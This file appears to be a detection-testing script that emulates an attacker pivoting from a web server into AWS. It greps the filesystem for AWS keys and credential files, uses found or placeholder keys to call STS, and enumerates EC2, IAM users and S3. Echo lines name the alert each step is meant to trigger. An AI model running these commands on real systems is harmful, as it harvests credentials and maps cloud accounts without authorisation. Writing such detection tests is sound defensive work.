payload.code:
# step-1: Endpoint: discover AWS credentials in filesystem
echo '[MP-004] EDR side: credential file discovery from web service context';
grep -r -l -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key' /home /var/www /opt 2>/dev/null | head -20;
find / -name 'credentials' -path '*/.aws/*' 2>/dev/null;
echo '[*] XDR should flag recursive grep for AWS key pattern from www-data'
# step-2: Endpoint: stage discovered keys and invoke cloud API
echo '[MP-004] Hybrid pivot: endpoint → cloud API call with discovered creds';
export AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY_ID:-AKIAIOSFODNN7EXAMPLE}";
export AWS_SECRET_ACCESS_KEY="${AWS_SECRET_ACCESS_KEY:-wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY}";
aws sts get-caller-identity --region us-east-1 2>&1 | head -5 || true;
echo '[*] CDR side: CloudTrail logs sts:GetCallerIdentity from non-corporate IP'
# step-3: Cloud: enumerate cloud environment (discovery phase)
echo '[MP-004] CDR side: cloud infrastructure discovery';
aws ec2 describe-instances --region us-east-1 --max-items 5 2>&1 | head -20 || true;
aws iam list-users --max-items 10 2>&1 | head -20 || true;
aws s3 ls 2>&1 | head -20 || true;
echo '[*] CDR should flag rapid multi-service enumeration from single principal'

